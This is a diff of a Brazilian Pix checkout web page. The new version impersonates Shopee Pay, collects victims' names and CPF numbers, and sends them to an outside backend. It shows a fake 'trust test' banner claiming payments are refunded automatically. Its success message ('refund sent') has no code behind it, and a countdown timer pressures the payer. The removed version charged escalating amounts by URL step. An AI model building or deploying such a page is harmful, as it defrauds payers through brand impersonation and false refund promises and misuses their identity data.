@@ -1,167 +1,341 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Checkout Seguro</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-<style>
-body { font-family: 'Inter', sans-serif; background: #f5f5f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-.container { width: 100%; max-width: 400px; padding: 20px; }
-.card { background: #ffffff; border-radius: 14px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; }
-.header img { height: 30px; margin-bottom: 10px; }
-h2 { font-size: 18px; color: #333; margin: 10px 0; }
-.price-tag { background: #e8f5e9; color: #2e7d32; padding: 10px; border-radius: 8px; font-size: 24px; font-weight: 700; margin: 15px 0; border: 1px solid #c8e6c9; }
-.input-group { text-align: left; margin-bottom: 15px; }
-label { font-size: 13px; color: #666; font-weight: 500; display: block; margin-bottom: 5px; }
-input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
-input:focus { border-color: #2e7d32; }
-button { width: 100%; background: #28a745; color: white; border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: 0.2s; margin-top: 10px; }
-button:hover { background: #218838; }
-button:disabled { background: #ccc; cursor: not-allowed; }
-.timer { color: #d32f2f; font-size: 13px; margin-top: 15px; font-weight: 500; }
-#qr-area { display: none; margin-top: 20px; border-top: 1px solid #eee; padding-top: 20px; }
-.qr-img { width: 200px; border-radius: 8px; border: 1px solid #eee; }
-.copy-box { background: #f8f9fa; padding: 10px; border: 1px dashed #ced4da; border-radius: 6px; font-size: 11px; color: #555; word-break: break-all; margin: 10px 0; }
-.status-msg { margin-top: 15px; font-weight: bold; color: #333; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout Seguro | Shopee Pay</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --shopee-orange: #ee4d2d;
+            --shopee-bg: #f5f5f5;
+            --text-dark: #222;
+            --border-color: #e8e8e8;
+        }
+
+        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--shopee-bg);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: white;
+            width: 100%;
+            max-width: 480px; /* Largura mobile ideal */
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 10px rgba(0,0,0,0.05);
+        }
+
+        /* HEADER */
+        .header {
+            background: white;
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .header h1 {
+            font-size: 18px;
+            color: var(--shopee-orange);
+            margin: 0;
+            font-weight: 500;
+        }
+        .shield-icon { width: 20px; height: 20px; fill: var(--shopee-orange); }
+
+        /* BODY */
+        .content { padding: 20px; flex: 1; }
+
+        /* INFO BOX (REEMBOLSO) */
+        .trust-box {
+            background: #fff5f1;
+            border: 1px solid #ffc5b2;
+            padding: 12px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .trust-box p {
+            font-size: 13px;
+            color: var(--shopee-orange);
+            margin: 0;
+            line-height: 1.4;
+            font-weight: 500;
+        }
+
+        /* INPUTS */
+        label { font-size: 14px; color: #555; margin-bottom: 6px; display: block; }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            transition: 0.3s;
+        }
+        input:focus { border-color: var(--shopee-orange); }
+
+        /* BOTÃO SHOPEE */
+        .btn-primary {
+            background-color: var(--shopee-orange);
+            color: white;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            text-transform: uppercase;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 2px 4px rgba(238, 77, 45, 0.2);
+        }
+        .btn-primary:active { opacity: 0.9; transform: scale(0.98); }
+        .btn-primary:disabled { background-color: #ccc; cursor: not-allowed; }
+
+        /* ÁREA DO QR CODE (ESCONDIDA) */
+        #result-area { display: none; text-align: center; margin-top: 20px; }
+        .qr-img { width: 220px; height: 220px; margin: 0 auto 15px; display: block; border: 1px solid #eee; }
+        
+        .pix-code-box {
+            background: #f8f8f8;
+            padding: 10px;
+            border: 1px dashed #ccc;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #555;
+            word-break: break-all;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        .btn-outline {
+            background: white;
+            color: var(--shopee-orange);
+            border: 1px solid var(--shopee-orange);
+            padding: 10px;
+            width: 100%;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        /* TIMER */
+        .timer-box {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #d0011b; /* Vermelho Shopee para erro/aviso */
+            font-weight: 500;
+        }
+
+        /* SPINNER DE CARREGAMENTO */
+        .spinner {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--shopee-orange);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* STATUS */
+        .status-aprovado {
+            background-color: #dff0d8;
+            color: #3c763d;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 15px;
+            font-weight: bold;
+            display: none;
+        }
+
+    </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="card">
+    <div class="container">
         <div class="header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/Pix_logo.png" alt="Pix">
+            <svg class="shield-icon" viewBox="0 0 24 24">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+            </svg>
+            <h1>Pagamento Seguro</h1>
         </div>
 
-        <div id="form-step">
-            <h2>Finalizar Pagamento</h2>
-            <div class="price-tag" id="valorDisplay">R$ --,--</div>
+        <div class="content">
             
-            <div class="input-group">
+            <div class="trust-box">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#EE4D2D"/>
+                    <path d="M11 16L17 10L15.59 8.58L11 13.17L8.41 10.59L7 12L11 16Z" fill="white"/>
+                </svg>
+                <p><strong>Teste de Confiança:</strong> O valor será devolvido para sua conta automaticamente em 5 segundos após o pagamento.</p>
+            </div>
+
+            <div id="form-area">
                 <label>Nome Completo</label>
-                <input type="text" id="nome" placeholder="Seu nome aqui" required>
-            </div>
-            
-            <div class="input-group">
-                <label>CPF (Apenas números)</label>
-                <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)" required>
+                <input type="text" id="nome" placeholder="Digite seu nome">
+                
+                <label>CPF (Somente números)</label>
+                <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)">
+
+                <button class="btn-primary" onclick="gerarPix()">GERAR PIX DE TESTE</button>
             </div>
 
-            <button onclick="gerarPix()" id="btnPagar">GERAR PIX AGORA</button>
-            <div class="timer">⏳ Oferta expira em 05:00</div>
-        </div>
+            <div class="spinner" id="loader"></div>
 
-        <div id="qr-area">
-            <h3>Escaneie para Pagar</h3>
-            <img id="qrImage" class="qr-img">
-            <p style="font-size:12px; color:#666; margin-bottom:5px;">Ou copie o código abaixo:</p>
-            <div class="copy-box" id="pixCopiaCola"></div>
-            <button onclick="copiarCodigo()" style="background:#fff; color:#28a745; border:1px solid #28a745; padding:10px;">Copiar Código Pix</button>
-            <div class="status-msg" id="statusMsg">Aguardando pagamento...</div>
+            <div id="result-area">
+                <p style="font-size:14px; color:#555; margin-bottom:10px;">Escaneie o QR Code abaixo:</p>
+                <img id="qr-image" class="qr-img" src="" alt="QR Code">
+                
+                <div class="pix-code-box" id="pix-code"></div>
+                
+                <button class="btn-outline" onclick="copiarCodigo()">Copiar Código Pix</button>
+
+                <div class="status-aprovado" id="msg-sucesso">
+                    ✅ PAGAMENTO APROVADO!<br>
+                    <span style="font-size:13px; font-weight:normal;">O estorno foi enviado para sua conta.</span>
+                </div>
+            </div>
+
+            <div class="timer-box" id="timer-display" style="display:none;">
+                Pagamento expira em: <span id="time">05:00</span>
+            </div>
+
         </div>
     </div>
-</div>
 
-<script>
-    const API_URL = "https://checkout-pix-profissional.onrender.com";
-    
-    // 1. LÓGICA AUTOMÁTICA DE VALORES
-    const params = new URLSearchParams(window.location.search);
-    const step = params.get("step");
-    
-    let valorCobrado = "37.90"; // Padrão (Fase 1)
-    
-    if (step === "2") {
-        valorCobrado = "47.90"; // Fase 2
-    }
+    <script>
+        const API_URL = "https://checkout-pix-profissional.onrender.com"; // Seu Backend
 
-    // Exibe o valor na tela (Bloqueado para edição)
-    document.getElementById("valorDisplay").innerText = "R$ " + valorCobrado.replace(".", ",");
-
-    // 2. MÁSCARA DE CPF
-    function mascaraCPF(i) {
-        let v = i.value.replace(/\D/g, "");
-        if (v.length > 11) v = v.slice(0, 11);
-        i.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-    }
-
-    // 3. GERAR PIX NO SERVIDOR
-    async function gerarPix() {
-        const nome = document.getElementById("nome").value;
-        const cpfLimpo = document.getElementById("cpf").value.replace(/\D/g, "");
-        const btn = document.getElementById("btnPagar");
-
-        if (nome.length < 3 || cpfLimpo.length !== 11) {
-            alert("Por favor, preencha seu Nome e um CPF válido.");
-            return;
+        // Máscara de CPF para ficar profissional
+        function mascaraCPF(i) {
+            let v = i.value.replace(/\D/g, "");
+            if (v.length > 11) v = v.slice(0, 11);
+            i.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
         }
 
-        btn.disabled = true;
-        btn.innerText = "Gerando QR Code...";
-
-        try {
-            const res = await fetch(`${API_URL}/pix`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    amount: parseFloat(valorCobrado),
-                    name: nome,
-                    cpf: cpfLimpo
-                })
-            });
-
-            const data = await res.json();
-
-            if (data.point_of_interaction) {
-                // Sucesso
-                const info = data.point_of_interaction.transaction_data;
-                document.getElementById("qrImage").src = `data:image/png;base64,${info.qr_code_base64}`;
-                document.getElementById("pixCopiaCola").innerText = info.qr_code;
-                
-                // Troca de tela
-                document.getElementById("form-step").style.display = "none";
-                document.getElementById("qr-area").style.display = "block";
-                
-                // Inicia monitoramento
-                monitorarPagamento(data.id);
-            } else {
-                alert("Erro ao gerar Pix. Verifique os dados.");
-                btn.disabled = false;
-                btn.innerText = "GERAR PIX AGORA";
+        async function gerarPix() {
+            const nome = document.getElementById('nome').value;
+            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+            
+            // VALIDAÇÃO BÁSICA
+            if (nome.length < 3 || cpf.length < 11) {
+                alert("Por favor, preencha Nome e CPF corretamente.");
+                return;
             }
-        } catch (e) {
-            alert("Erro de conexão com o servidor.");
-            btn.disabled = false;
-            btn.innerText = "GERAR PIX AGORA";
-        }
-    }
 
-    // 4. MONITORAMENTO E SUCESSO
-    function monitorarPagamento(id) {
-        const statusMsg = document.getElementById("statusMsg");
-        const intervalo = setInterval(async () => {
+            // UI: Esconde form, mostra loader
+            document.getElementById('form-area').style.opacity = '0.5';
+            document.querySelector('.btn-primary').disabled = true;
+            document.querySelector('.btn-primary').innerText = "GERANDO...";
+            document.getElementById('loader').style.display = 'block';
+
             try {
-                const res = await fetch(`${API_URL}/pix/${id}`);
-                const json = await res.json();
+                // ENVIA O PEDIDO PARA SEU ROBÔ
+                const res = await fetch(`${API_URL}/pix`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        amount: 0.01, // VALOR DO TESTE (MUDE AQUI SE PRECISAR)
+                        name: nome,
+                        cpf: cpf
+                    })
+                });
+                
+                const data = await res.json();
 
-                if (json.status === 'approved') {
-                    clearInterval(intervalo);
-                    statusMsg.innerHTML = "✅ PAGAMENTO APROVADO!<br><span style='font-size:12px; font-weight:normal'>Estorno enviado.</span>";
-                    statusMsg.style.color = "#2e7d32";
+                if (data.point_of_interaction) {
+                    // SUCESSO
+                    const qr = data.point_of_interaction.transaction_data;
                     
-                    // AQUI VOCÊ PODE REDIRECIONAR O CLIENTE
-                    // setTimeout(() => { window.location.href = "OBRIGADO.html"; }, 3000);
+                    document.getElementById('qr-image').src = `data:image/png;base64,${qr.qr_code_base64}`;
+                    document.getElementById('pix-code').innerText = qr.qr_code;
+                    
+                    // UI: Troca para a tela de resultado
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('form-area').style.display = 'none';
+                    document.getElementById('result-area').style.display = 'block';
+                    document.getElementById('timer-display').style.display = 'block';
+
+                    iniciarTimer();
+                    monitorarPagamento(data.id);
+                } else {
+                    alert("Erro ao gerar Pix. Tente novamente.");
+                    location.reload();
                 }
-            } catch (e) {}
-        }, 3000);
-    }
 
-    function copiarCodigo() {
-        navigator.clipboard.writeText(document.getElementById("pixCopiaCola").innerText);
-        alert("Código copiado!");
-    }
-</script>
+            } catch (error) {
+                console.error(error);
+                alert("Erro de conexão. Verifique sua internet.");
+                location.reload();
+            }
+        }
 
+        function iniciarTimer() {
+            let duration = 60 * 5; // 5 minutos
+            const display = document.querySelector('#time');
+            
+            const timer = setInterval(function () {
+                let minutes = parseInt(duration / 60, 10);
+                let seconds = parseInt(duration % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--duration < 0) {
+                    clearInterval(timer);
+                    display.textContent = "EXPIRADO";
+                }
+            }, 1000);
+        }
+
+        function monitorarPagamento(id) {
+            const intervalo = setInterval(async () => {
+                try {
+                    const res = await fetch(`${API_URL}/pix/${id}`);
+                    const json = await res.json();
+
+                    if (json.status === 'approved') {
+                        clearInterval(intervalo);
+                        // MOSTRA O SUCESSO
+                        document.getElementById('msg-sucesso').style.display = 'block';
+                        document.getElementById('qr-image').style.opacity = '0.3';
+                        document.querySelector('.btn-outline').style.display = 'none';
+                        document.getElementById('timer-display').innerHTML = "<b>REEMBOLSO ENVIADO! 🚀</b>";
+                        document.getElementById('timer-display').style.color = "green";
+                    }
+                } catch (e) {}
+            }, 3000);
+        }
+
+        function copiarCodigo() {
+            navigator.clipboard.writeText(document.getElementById('pix-code').innerText);
+            const btn = document.querySelector('.btn-outline');
+            btn.innerText = "Copiado!";
+            btn.style.background = "#e8f0fe";
+            setTimeout(() => { 
+                btn.innerText = "Copiar Código Pix"; 
+                btn.style.background = "white";
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
